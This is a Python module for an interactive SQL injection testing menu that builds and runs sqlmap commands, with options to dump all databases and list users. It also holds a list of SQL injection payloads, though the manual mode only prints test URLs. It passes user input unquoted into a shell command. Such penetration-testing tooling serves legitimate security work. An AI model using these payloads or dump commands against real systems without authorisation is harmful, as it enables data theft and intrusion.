#!/usr/bin/env python3

import subprocess
import sys
import os
from core.utils import *
from core.config import *

class SQLInjectionToolkit:
    def __init__(self):
        self.tools = {
            "sqlmap": "Automatic SQL injection and database takeover tool",
            "sqlninja": "SQL Server injection & takeover tool",
            "bbqsql": "Blind SQL injection framework",
            "NoSQLMap": "NoSQL injection testing tool"
        }
    
    def run_sqlmap(self):
        """SQLMap - Advanced SQL injection testing"""
        banner("SQLMap - Automatic SQL Injection Tool")
        
        # Target specification
        target_type = get_user_input("Target type", choices=["url", "request_file"])
        
        if target_type == "url":
            target = get_user_input("Enter target URL (e.g., https://example.com/page.php?id=1)")
            target_param = f"-u '{target}'"
        else:
            request_file = get_user_input("Enter path to HTTP request file")
            target_param = f"-r {request_file}"
        
        # Database type (optional)
        console.print("\n[bold cyan]Database types:[/bold cyan]")
        db_types = {
            "1": "auto-detect",
            "2": "MySQL", 
            "3": "PostgreSQL",
            "4": "Oracle",
            "5": "Microsoft SQL Server",
            "6": "SQLite"
        }
        
        for key, db in db_types.items():
            console.print(f"  {key}. {db}")
        
        db_choice = get_user_input("Choose database type (1-6)", choices=["1", "2", "3", "4", "5", "6"])
        
        if db_choice != "1":
            db_param = f"--dbms={db_types[db_choice].lower().replace(' ', '_')}"
        else:
            db_param = ""
        
        # Risk and level
        risk = get_user_input("Risk level (1-3) [default: 1]", choices=["1", "2", "3"]) or "1"
        level = get_user_input("Level (1-5) [default: 1]", choices=["1", "2", "3", "4", "5"]) or "1"
        
        # Techniques
        console.print("\n[bold cyan]Injection techniques:[/bold cyan]")
        console.print("  1. Boolean-based blind")
        console.print("  2. Time-based blind") 
        console.print("  3. Error-based")
        console.print("  4. UNION query-based")
        console.print("  5. Stacked queries")
        console.print("  6. All techniques")
        
        tech_choice = get_user_input("Choose technique (1-6)", choices=["1", "2", "3", "4", "5", "6"])
        
        if tech_choice == "6":
            tech_param = ""
        else:
            techniques = {"1": "B", "2": "T", "3": "E", "4": "U", "5": "S"}
            tech_param = f"--technique {techniques[tech_choice]}"
        
        # What to do after finding injection
        console.print("\n[bold cyan]Actions after finding injection:[/bold cyan]")
        console.print("  1. Just detect injection")
        console.print("  2. Enumerate databases")
        console.print("  3. Enumerate tables")
        console.print("  4. Dump database")
        console.print("  5. Get database users")
        console.print("  6. Get current user")
        
        action_choice = get_user_input("Choose action (1-6)", choices=["1", "2", "3", "4", "5", "6"])
        
        action_params = {
            "1": "",
            "2": "--dbs",
            "3": "--tables",
            "4": "--dump-all",
            "5": "--users",
            "6": "--current-user"
        }
        
        action_param = action_params[action_choice]
        
        # Additional options
        batch_mode = True  # Auto-enable batch mode
        batch_param = "--batch" if batch_mode else ""
        
        threads = get_user_input("Number of threads [default: 1]") or "1"
        thread_param = f"--threads {threads}"
        
        # Build command
        command_parts = [
            "sqlmap",
            target_param,
            db_param,
            f"--risk {risk}",
            f"--level {level}",
            tech_param,
            action_param,
            batch_param,
            thread_param
        ]
        
        command = " ".join([part for part in command_parts if part])
        
        console.print(f"\n[bold yellow]Command:[/bold yellow] {command}")
        
        console.print(f"\n[bold green]Executing: {command}[/bold green]")
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=1800)
            if result.stdout:
                console.print("\n[bold green]Results:[/bold green]")
                console.print(result.stdout)
            if result.stderr:
                Warning(f"Errors: {result.stderr}")
        except subprocess.TimeoutExpired:
            Warning("Command timed out after 30 minutes")
        except Exception as e:
            Warning(f"Error executing command: {e}")
        
        show_next_steps("SQL Injection", CATEGORIES["sql_injection"]["next_steps"])
    
    def manual_sql_testing(self):
        """Manual SQL injection testing with common payloads"""
        banner("Manual SQL Injection Testing")
        
        target = get_user_input("Enter target URL with parameter (e.g., https://example.com/page.php?id=1)")
        
        console.print("\n[bold cyan]SQL Injection payload categories:[/bold cyan]")
        console.print("  1. Authentication bypass")
        console.print("  2. Union-based injection")
        console.print("  3. Boolean-based blind")
        console.print("  4. Time-based blind")
        console.print("  5. Error-based injection")
        console.print("  6. All payloads")
        
        payload_choice = get_user_input("Choose payload category (1-6)", choices=["1", "2", "3", "4", "5", "6"])
        
        payloads = {
            "1": [  # Authentication bypass
                "' OR '1'='1",
                "' OR 1=1 --",
                "admin' --",
                "' OR 'a'='a",
                "') OR ('1'='1"
            ],
            "2": [  # Union-based
                "' UNION SELECT NULL, NULL --",
                "' UNION SELECT 1,2,3,4,5 --",
                "' UNION SELECT user(), version(), database() --",
                "' UNION SELECT table_name FROM information_schema.tables --"
            ],
            "3": [  # Boolean-based blind
                "' AND 1=1 --",
                "' AND 1=2 --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --",
                "' AND LENGTH(database())>0 --"
            ],
            "4": [  # Time-based blind
                "' AND SLEEP(5) --",
                "'; WAITFOR DELAY '00:00:05' --",
                "' OR IF(1=1, SLEEP(5), 0) --",
                "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND SLEEP(5)) --"
            ],
            "5": [  # Error-based
                "' AND ExtractValue(1, concat(0x7e, version(), 0x7e)) --",
                "' AND UpdateXML(1, concat(0x7e, user(), 0x7e), 1) --",
                "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --"
            ]
        }
        
        if payload_choice == "6":
            # All payloads
            all_payloads = []
            for category_payloads in payloads.values():
                all_payloads.extend(category_payloads)
            test_payloads = all_payloads
        else:
            test_payloads = payloads[payload_choice]
        
        info(f"Testing {len(test_payloads)} payloads against {target}")
        
        for i, payload in enumerate(test_payloads, 1):
            console.print(f"\n[bold yellow]Testing payload {i}/{len(test_payloads)}:[/bold yellow]")
            console.print(f"Payload: {payload}")
            
            # Replace parameter value with payload
            if '=' in target:
                base_url, params = target.split('?', 1)
                param_pairs = params.split('&')
                first_param = param_pairs[0].split('=')[0]
                test_url = f"{base_url}?{first_param}={payload}"
                
                console.print(f"Test URL: {test_url}")
                
                # In a real implementation, you would make the HTTP request here
                # For safety, we'll just show what would be tested
                console.print("[bold blue]→[/bold blue] In a real test, this would send an HTTP request")
                
                console.print("[bold yellow]Continuing to next payload...[/bold yellow]")
                continue
            else:
                break
        
        show_next_steps("SQL Injection", CATEGORIES["sql_injection"]["next_steps"])
    
    def display_menu(self):
        """Display SQL injection toolkit menu"""
        clear()
        Title("SQL Injection Testing Toolkit")
        
        console.print(DISCLAIMER)
        Continue()
        
        display_tools_table("SQL Injection", self.tools)
        
        console.print("\n[bold cyan]Available Tools:[/bold cyan]")
        console.print("  1. SQLMap - Automatic SQL injection tool")
        console.print("  2. Manual SQL injection testing")
        console.print("  3. Back to main menu")
        
        choice = get_user_input("Select tool (1-3)", choices=["1", "2", "3"])
        
        if choice == "1":
            self.run_sqlmap()
        elif choice == "2":
            self.manual_sql_testing()
        elif choice == "3":
            return
        
        Continue()

def run():
    """Entry point for SQL injection toolkit"""
    toolkit = SQLInjectionToolkit()
    toolkit.display_menu()